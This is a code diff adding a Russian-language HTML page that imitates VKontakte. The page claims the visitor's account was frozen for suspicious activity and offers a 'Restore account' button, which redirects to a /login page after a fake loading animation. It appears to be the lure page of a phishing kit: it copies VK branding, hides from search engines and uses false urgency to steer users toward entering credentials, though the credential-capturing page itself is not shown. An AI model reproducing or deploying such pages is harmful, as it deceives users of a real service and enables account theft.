@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./base/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="./base/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="./base/style.css">
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href=""><img src="./base/logo.svg" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                                    <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16" id="error_circle_fill_16"><path d="M8 16c-4.416 0-8-3.584-8-8s3.584-8 8-8 8 3.584 8 8-3.584 8-8 8zm0-7.059c.468 0 .847-.38.847-.847V4.612a.847.847 0 10-1.694 0v3.482c0 .468.38.847.847.847zm0 3.294a.941.941 0 100-1.882.941.941 0 000 1.882z" fill="#e64646"></path><path d="M8 8.941c.468 0 .847-.38.847-.847V4.612a.847.847 0 10-1.694 0v3.482c0 .468.38.847.847.847zm0 3.294a.941.941 0 100-1.882.941.941 0 000 1.882z" fill="#fff"></path></svg>
+                <h1 class="title">Ваша страница была заморожена</h1>
+                <p class="subtitle">Мы заметили подозрительную 
+активность с вашего профиля, нам пришлось заморозить вашу страницу, 
+чтобы не дать доступ злоумышленникам.<br><br>Вы можете восстановить вашу страницу прямо сейчас</p>
+                <button type="button" class="button"><span>Восстановить аккаунт</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                                    </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "/login";
+            }, 500);
+        });
+    </script>
+
+</body></html>
